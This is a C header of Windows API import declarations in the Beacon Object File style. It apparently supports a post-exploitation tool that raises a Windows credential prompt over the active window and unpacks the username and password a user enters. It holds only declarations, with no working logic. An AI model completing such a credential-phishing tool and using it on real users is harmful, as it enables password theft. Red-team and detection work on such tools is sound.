#pragma once

#include <windows.h>
#include <wincred.h>

#define MAXLEN 256
#define CREDUIWIN_GENERIC 0x1
#define CREDUIWIN_CHECKBOX 0x2
#define CRED_PACK_GENERIC_CREDENTIALS 0x4

//CREDUI
DECLSPEC_IMPORT DWORD WINAPI CREDUI$CredUIPromptForWindowsCredentialsW(
	PCREDUI_INFOW pUiInfo,
	DWORD dwAuthError,
	ULONG *pulAuthPackage,
	LPCVOID pvInAuthBuffer,
	ULONG ulInAuthBufferSize,
	LPVOID *ppvOutAuthBuffer,
	ULONG *pulOutAuthBufferSize,
	BOOL *pfSave,
	DWORD dwFlags
	);

DECLSPEC_IMPORT BOOL WINAPI CREDUI$CredUnPackAuthenticationBufferW(
	DWORD dwFlags,
	PVOID pAuthBuffer,
	DWORD cbAuthBuffer,
	LPWSTR pszUserName,
	DWORD *pcchMaxUserName,
	LPWSTR pszDomainName,
	DWORD *pcchMaxDomainName,
	LPWSTR pszPassword,
	DWORD *pcchMaxPassword
	);

DECLSPEC_IMPORT BOOL WINAPI CREDUI$CredPackAuthenticationBufferW(
	DWORD dwFlags,
	LPWSTR pszUserName,
	LPWSTR pszPassword,
	PBYTE pPackedCredentials,
	DWORD *pcbPackedCredentials
	);

//KERNEL32
WINBASEAPI HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
WINBASEAPI BOOL WINAPI KERNEL32$TerminateThread(HANDLE hThread, DWORD dwExitCode);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
WINBASEAPI BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, PVOID);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId();
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI BOOL WINAPI KERNEL32$QueryFullProcessImageNameW(HANDLE hProcess, DWORD  dwFlags, LPWSTR lpExeName, PDWORD lpdwSize);

//MSVCRT
WINBASEAPI void __cdecl MSVCRT$memset(void *dest, int c, size_t count);
WINBASEAPI int __cdecl MSVCRT$_wcsicmp(const wchar_t *_Str1, const wchar_t *_Str2);
WINBASEAPI int __cdecl MSVCRT$_stricmp(const char *string1, const char *string2);

//USER32
WINUSERAPI WINBOOL USER32$EnumWindows(WNDENUMPROC lpEnumFunc,LPARAM lParam);
WINUSERAPI WINBOOL USER32$IsWindowVisible(HWND hWnd);
WINUSERAPI LRESULT USER32$SendMessageA(HWND hWnd,UINT Msg,WPARAM wParam,LPARAM lParam);
WINUSERAPI WINBOOL USER32$PostMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
WINUSERAPI HWND USER32$GetForegroundWindow();
WINUSERAPI DWORD USER32$GetWindowThreadProcessId(HWND hWnd, LPDWORD lpdwProcessId);
WINUSERAPI LONG_PTR USER32$GetWindowLongPtrA(HWND hWnd, int  nIndex);
WINUSERAPI LONG_PTR USER32$GetWindowLongA(HWND hWnd, int  nIndex);

//SECUR32
WINBASEAPI BOOLEAN WINAPI SECUR32$GetUserNameExW(EXTENDED_NAME_FORMAT NameFormat, LPWSTR lpNameBuffer, PULONG nSize);

//SHLWAPI
WINBASEAPI PCWSTR WINAPI SHLWAPI$StrStrIW(PCWSTR pszFirst, PCWSTR pszSrch);
